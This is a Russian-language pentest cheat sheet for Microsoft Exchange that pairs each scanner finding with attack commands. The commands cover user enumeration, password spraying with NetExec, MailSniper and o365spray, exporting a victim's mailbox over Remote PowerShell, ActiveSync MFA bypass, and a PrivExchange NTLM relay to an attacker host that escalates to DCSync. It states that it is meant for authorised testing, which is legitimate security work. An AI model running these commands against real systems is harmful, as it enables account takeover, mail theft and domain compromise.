# Exchange — что делать с каждым найденным недостатком (RU)

Практический разбор находок из блока **Weaknesses / exposures** сканера
`exchange_recon.py`. Для каждого недостатка: что это, почему важно, что можно
сделать (чекеры и направления), инструменты и команды.

> ⚠️ Только для авторизованного пентеста / обучения. Многие шаги ниже —
> активные действия (spray, вход по кредам, RCE). Сканер их **не делает**;
> это справочник для ручной работы в рамках согласованного скоупа.

Оглавление:
- [eol-product — Exchange снят с поддержки](#eol-product)
- [ntlm-internal-disclosure — утечка домена/хоста через NTLM](#ntlm-internal-disclosure)
- [version-disclosure — точный build виден без авторизации](#version-disclosure)
- [user-enum-surface — можно перебирать логины без кред](#user-enum-surface)
- [password-spray-surface — точки для password spray](#password-spray-surface)
- [ecp-exposed — доступна админ-панель ECP](#ecp-exposed)
- [powershell-exposed — доступен Remote PowerShell](#powershell-exposed)
- [activesync-exposed — открыт ActiveSync](#activesync-exposed)
- [ews-ssrf-surface — EWS как источник SSRF/relay](#ews-ssrf-surface)

---

## eol-product
**Exchange снят с поддержки (2007 / 2010 / 2013, а с окт-2025 — и 2016/2019).**

**Почему важно.** Для EoL-версий Microsoft больше не выпускает security-update.
Любая CVE, найденная после даты EoL, остаётся **навсегда непропатченной**.
Версия-гейт для таких хостов бесполезен — считай их уязвимыми по умолчанию.

**Что делать.**
- Сверить точный build с таблицей MS (см. `version-disclosure`) и вытащить все
  post-EoL CVE.
- В отчёте пентеста — это отдельная high-находка: единственный фикс = миграция
  (Exchange Subscription Edition / Exchange Online), патчи невозможны.
- Проверить, доступен ли хост из интернета — EoL-Exchange на периметре это
  типовая точка входа (ProxyShell/ProxyLogon и т.д.).

**Инструменты.** `nmap -sV`, MS build-numbers table, наш сканер (`--active`).

---

## ntlm-internal-disclosure
**Внутренние имена AD (NetBIOS/DNS домен, hostname, ОС) утекают через
неаутентифицированный NTLM-негошиэйт.**

**Почему важно.** Любой эндпоинт с NTLM отдаёт в Type-2 challenge: имя домена,
FQDN сервера и версию ОС — без единой учётки. Это фундамент для дальнейших атак.

**Что делать.**
- Сформировать форматы логинов: `DOMAIN\user`, `user@dns.domain` — понадобится
  для enum и spray.
- Засеять разведку AD: имя домена/леса, версия ОС контроллеров рядом.
- Наметить relay-цели (домен → поиск других хостов с NTLM без EPA).

**Команды.**
```bash
# наш сканер уже вытащил это в разделе "Domain / host"
# перепроверить вручную:
curl -s -k -X POST https://target/rpc/ -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" -D - -o /dev/null
# готовые тулзы:
nxc smb <ip>           # NetExec: домен, ОС, hostname
python3 -c "import impacket"  # ntlmrelayx / getArch и т.п.
```

---

## version-disclosure
**Точный build Exchange виден до авторизации** (заголовок `X-OWA-Version` или
путь `/owa/auth/<build>/`).

**Почему важно.** Точный `15.x.YYYY.ZZ` → точный маппинг на CVE и пропущенные SU.
Позволяет не «стрелять вслепую», а бить прицельно.

**Что делать.**
- Сопоставить build с таблицей MS «Exchange build numbers and release dates».
- Найти разницу между установленным SU и последним доступным → список
  непокрытых уязвимостей.
- Прогнать наш сканер с `--active` для подтверждения ProxyLogon/ProxyShell.

**Команды.**
```bash
curl -s -k https://target/owa/ | grep -oE '/owa/auth/[0-9.]+/'
curl -s -k -I https://target/autodiscover/autodiscover.xml | grep -i x-owa-version
```

---

## user-enum-surface
**Можно перебирать валидные логины без учётной записи.**

**Почему важно.** Список валидных пользователей — вход для password spray, для
Kerberoast/AS-REP по AD и для целевого фишинга. Exchange даёт сразу несколько
безкредовых методов.

**Что делать — методы:**

1. **AutodiscoverV2** (тихо, точно, нужен формат email):
   ```bash
   python3 exchange_recon.py target --enum -U emails.txt --enum-method autodiscover
   ```
   Валидный ящик роутится на бэкенд → ответ отличается (status/тело/
   `X-BackEndCookie`) от контрольного несуществующего.

2. **Time-based NTLM/Basic** (шумнее, без формата email):
   ```bash
   python3 exchange_recon.py target --enum -U users.txt --domain CORP --enum-method timing
   ```
   Валидный логин заставляет бэкенд делать больше работы → выше задержка
   относительно baseline из случайных имён.

3. **Auto** (оба, дедуп):
   ```bash
   python3 exchange_recon.py target --enum -U users.txt --domain CORP
   ```

**Альтернативные тулзы.**
```bash
# OWA timing / GAL harvest
Invoke-UsernameHarvestOWA -ExchHostname target -UserList users.txt -Domain CORP  # MailSniper
o365spray --enum -U users.txt --domain corp.com                                   # O365/Exchange
kerbrute userenum -d corp.com users.txt --dc <dc-ip>                               # если виден Kerberos
```

> Находки сканера помечаются `valid` эвристически — перед spray подтверди
> вторым методом, чтобы не спалиться на ложняках.

---

## password-spray-surface
**Открыты точки аутентификации (OWA/EWS/EAS/Autodiscover) для распыления
пароля.**

**Почему важно.** С валидными логинами (из `user-enum-surface`) один-два
типовых пароля часто дают рабочую учётку. Главное — **не залочить аккаунты**.

**Что делать.**
1. Узнать lockout policy (окно/порог), рассчитать безопасный темп: обычно
   1 пароль на все учётки за окно, пауза дольше окна.
2. Составить пароли под политику сложности (`Season+Year!`, `CompanyName1`, …).
3. Распылять по тихому каналу (EAS/EWS часто без MFA — см. `activesync-exposed`).

**Команды.**
```bash
# NetExec (аккуратно, с задержкой)
nxc http target -u users.txt -p 'Summer2026!' --continue-on-success
# MailSniper
Invoke-PasswordSprayOWA -ExchHostname target -UserList valid.txt -Password 'Summer2026!'
# o365spray
o365spray --spray -U valid.txt -p 'Summer2026!' --domain corp.com
```

> ⚠️ Это уже активная атака, а не чекер. Только в согласованном скоупе, с учётом
> lockout, желательно с разрешением на риск блокировок.

---

## ecp-exposed
**Доступна панель ECP (Exchange Control Panel / admin).**

**Почему важно.** ECP — админка Exchange. Исторически ключевая цель:
ProxyShell/ProxyNotShell били именно по ECP/Autodiscover. Даже без RCE, при
наличии кред это путь к чужим ящикам и к персистентности.

**Что делать.**
- Проверить, доступен ли `/ecp/` обычному пользователю (частый misconfig; должен
  быть только для админов).
- С кредами админа/оператора: если у учётки роль **ApplicationImpersonation** —
  можно действовать от имени любого ящика (чтение/отправка почты).
- Проверить внутренние сервисы ECP: `/ecp/DDI/DDIService.svc/GetObject`,
  `/ecp/DDI/DDIService.svc/GetList` (использовались в цепочках RCE).
- Дефолтные/слабые креды сервисных учёток.

**Команды.**
```bash
curl -s -k -I https://target/ecp/                       # доступность
# с кредами — вход и проверка ролей:
#  ECP GUI -> permissions -> admin roles; ищем ApplicationImpersonation
Get-ManagementRoleAssignment -Role ApplicationImpersonation   # в Exchange PS
```

---

## powershell-exposed
**Доступен Remote PowerShell endpoint (`/PowerShell/`).**

**Почему важно.** Это тот самый бэкенд, через который ProxyShell получает RCE.
С валидными кредами — прямой доступ к Exchange-командлетам (управление всеми
ящиками, экспорт почты, создание правил).

**Что делать (с кредами).**
```powershell
$cred = Get-Credential
$s = New-PSSession -ConfigurationName Microsoft.Exchange `
     -ConnectionUri https://target/PowerShell/ `
     -Authentication Basic -Credential $cred -AllowRedirection
Import-PSSession $s
Get-Mailbox -ResultSize 5
# экспорт чужого ящика в .pst (если есть право):
New-MailboxExportRequest -Mailbox victim -FilePath \\host\share\v.pst
```
- Без кред — цель для ProxyShell (см. CVE-раздел сканера).
- Проверить, включён ли Basic на `/PowerShell/` (нужно для внешнего входа).

---

## activesync-exposed
**Открыт Exchange ActiveSync (`/Microsoft-Server-ActiveSync`).**

**Почему важно.** EAS часто исключён из MFA / conditional access → одно-факторный
доступ к почте и **тихий канал для spray**, минуя защиту OWA.

**Что делать.**
- Проверить доступ к почте по EAS с одной парой логин/пароль (обход MFA).
- Использовать EAS как канал для аккуратного spray (меньше сигналов, чем OWA).

**Команды.**
```bash
# PEAS / peas.py — доступ к почте и файлам через EAS
python3 peas.py -u 'CORP\user' -p 'Pass' --server target
# проверка одиночной аутентификации:
curl -s -k -u 'CORP\user:Pass' "https://target/Microsoft-Server-ActiveSync?Cmd=FolderSync&User=user&DeviceId=1&DeviceType=px" -D -
```

---

## ews-ssrf-surface
**Присутствует EWS (`/EWS/Exchange.asmx`) — источник SSRF-как-фичи и NTLM-relay
триггеров.**

**Почему важно.** EWS-операции `Subscribe` (push-подписка) и
`CreateAttachmentFromUri` заставляют сервер сам ходить по URL — это SSRF и
триггеры NTLM-утечки/relay (PrivExchange, CVE-2024-21410). С кредами EWS = полный
доступ к почте и делегированию.

**Что делать.**
- Без кред: EWS `Subscribe` как триггер NTLM-relay → см. CVE-2024-21410 и
  PrivExchange (relay на LDAP/ADCS → повышение до DCSync).
- С кредами: чтение/отправка почты, поиск в чужих ящиках при делегировании.

**Команды/тулзы.**
```bash
# PrivExchange: заставить Exchange аутентифицироваться к нам и отрелеить
python3 privexchange.py -ah <attacker-ip> target -u user -d corp.com -p Pass
# relay:
ntlmrelayx.py -t ldap://<dc> --escalate-user <us>   # классический PrivExchange-чейн
# MailSniper — поиск по почте с кредами
Invoke-SelfSearch -Mailbox user@corp.com -ExchHostname target
```

---

## Общий порядок действий

```
recon (наш сканер)
  └─ version + endpoints + weaknesses
        ├─ user-enum-surface   ──► --enum (валидные логины)
        │                              └─ password-spray-surface ──► рабочая учётка
        │                                                               ├─ ecp-exposed / powershell-exposed ──► управление ящиками
        │                                                               ├─ ews-ssrf-surface ──► relay / PrivExchange ──► DCSync
        │                                                               └─ activesync-exposed ──► обход MFA
        └─ CVE (ProxyShell/Logon) ──► RCE (вне сканера, отдельные PoC)
```

Сканер закрывает **левую часть** (recon/enum/детект) без эксплуатации; правая
часть (spray, вход, RCE, relay) — ручная работа по этому чит-листу в рамках
разрешённого скоупа.
